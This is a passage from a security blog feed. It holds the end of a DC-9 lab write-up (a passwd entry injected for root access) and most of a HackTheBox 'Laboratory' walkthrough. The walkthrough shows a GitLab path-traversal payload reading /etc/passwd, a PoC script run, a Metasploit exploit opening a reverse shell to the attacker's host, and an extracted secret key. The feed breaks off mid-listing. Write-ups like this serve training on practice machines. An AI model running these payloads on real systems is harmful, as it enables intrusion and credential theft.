<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">fredf@dc-9:/tmp$ cat /etc/passwd
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
</span></span><span class="line"><span class="cl">janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
</span></span><span class="line"><span class="cl">iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</span></span></code></pre></div><h4 id="su---root">SU - root</h4>
<p>Now I can switch to my account and get a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/tmp$ su iamf
</span></span><span class="line"><span class="cl">Password: pass123
</span></span><span class="line"><span class="cl">root@dc-9:/tmp#
</span></span></code></pre></div><p>And here is the flag,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@dc-9:~# cat theflag.txt 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
</span></span><span class="line"><span class="cl">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
</span></span><span class="line"><span class="cl">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
</span></span><span class="line"><span class="cl">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
</span></span><span class="line"><span class="cl">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
</span></span><span class="line"><span class="cl">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
</span></span><span class="line"><span class="cl">                                                                             
</span></span><span class="line"><span class="cl">Congratulations - you have <span class="k">done</span> well to get to this point.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
</span></span><span class="line"><span class="cl">who have taken the <span class="nb">time</span> to <span class="nb">complete</span> the various DC challenges.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I also want to send out a big thank you to the various members of @m0tl3ycr3w .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">They are an inspirational bunch of fellows.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sure, they might smell a bit, but...just kidding.  :-<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sadly, all things must come to an end, and this will be the last ever
</span></span><span class="line"><span class="cl">challenge in the DC series.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">So long, and thanks <span class="k">for</span> all the fish.
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/hackthebox/laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/laboratory/</guid>
      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
      <content:encoded><![CDATA[<p>Laboratory is features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Arbitrary File Read</li>
<li>Adding Metasploit module</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover a git repository</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.4.41
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Laboratory
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-07-05T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2024-03-03T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ searchsploit gitlab
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">Exploit Title                                                           <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
</span></span><span class="line"><span class="cl">GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
</span></span><span class="line"><span class="cl">Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
</span></span><span class="line"><span class="cl">Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
</span></span><span class="line"><span class="cl">Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
</span></span><span class="line"><span class="cl">Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
</span></span><span class="line"><span class="cl">NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- ------------------------------
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
</p>
<p>The payload will then turn into an attached file.</p>
<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username      : iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Trying to Login...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login Successful!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating an Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Moving Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/passwd
</span></span><span class="line"><span class="cl">----------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class="line"><span class="cl">gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class="line"><span class="cl">gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class="line"><span class="cl">mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class="line"><span class="cl">registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</span></span></code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ msfdb reinit
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Stopping database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating initial database schema
</span></span></code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</span></span></code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
</span></span><span class="line"><span class="cl"><span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
</span></span><span class="line"><span class="cl"><span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
</span></span><span class="line"><span class="cl"><span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
</span></span></code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
</span></span><span class="line"><span class="cl">git.laboratory.htb
</span></span></code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -la /
</span></span><span class="line"><span class="cl">total <span class="m">88</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~$ grep -Ri dexter 2&gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
</span></span><span class="line"><span class="cl">git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
</span></span></code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">total <span class="m">40</span>
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
</span></span><span class="line"><span class="cl">drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
